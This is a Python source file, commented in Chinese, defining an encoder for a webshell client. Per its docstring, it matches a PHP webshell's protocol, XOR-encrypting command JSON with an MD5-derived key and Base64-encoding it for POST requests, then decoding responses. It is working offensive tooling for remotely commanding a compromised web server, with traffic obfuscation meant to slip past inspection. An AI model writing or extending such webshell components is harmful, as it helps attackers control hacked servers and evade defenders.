"""
编码器 - XOR + Base64 加密通信

协议：与 PHP webshell 保持一致
  发送：JSON -> UTF-8 bytes -> XOR -> latin-1 str -> Base64 -> POST
  接收：Base64 -> latin-1 str -> XOR -> UTF-8 bytes -> JSON

关键：UTF-8 编码 JSON（含中文），XOR 处理后的字节用 latin-1 序列化为字符串。
PHP 端 chr/ord 天然操作字节 (0-255)，与 latin-1 一一对应。
"""
import json
import base64
import hashlib


class Encoder:
    """负责请求编码和响应解码"""

    def __init__(self, password: str):
        self.key = hashlib.md5(password.encode()).hexdigest()

    def _xor_bytes(self, data_bytes):
        """XOR 字节数组，返回字节数组"""
        key_bytes = self.key.encode('ascii')
        key_len = len(key_bytes)
        return bytes(b ^ key_bytes[i % key_len] for i, b in enumerate(data_bytes))

    def encode(self, cmd: dict) -> str:
        """
        编码流程：
          JSON(UTF-8) -> bytes -> XOR -> latin-1 字符串 -> Base64
        """
        # 1. JSON 序列化为 UTF-8 字符串
        json_str = json.dumps(cmd, ensure_ascii=False)
        # 2. UTF-8 编码为字节
        json_bytes = json_str.encode('utf-8')
        # 3. XOR 加密
        xored = self._xor_bytes(json_bytes)
        # 4. 每个字节映射为 latin-1 字符（chr(b) for b in 0-255）
        latin1_str = xored.decode('latin-1')
        # 5. Base64 编码
        return base64.b64encode(latin1_str.encode('latin-1')).decode('ascii')

    def decode(self, raw_response: str) -> dict:
        """
        解码流程：
          Base64 -> latin-1 bytes -> XOR -> UTF-8 解码 -> JSON
        """
        # 1. Base64 解码，得到 latin-1 编码的字节
        latin1_bytes = base64.b64decode(raw_response)
        # 2. XOR 解密
        decrypted = self._xor_bytes(latin1_bytes)
        # 3. UTF-8 解码为 JSON 字符串
        json_str = decrypted.decode('utf-8')
        # 4. JSON 解析
        return json.loads(json_str)
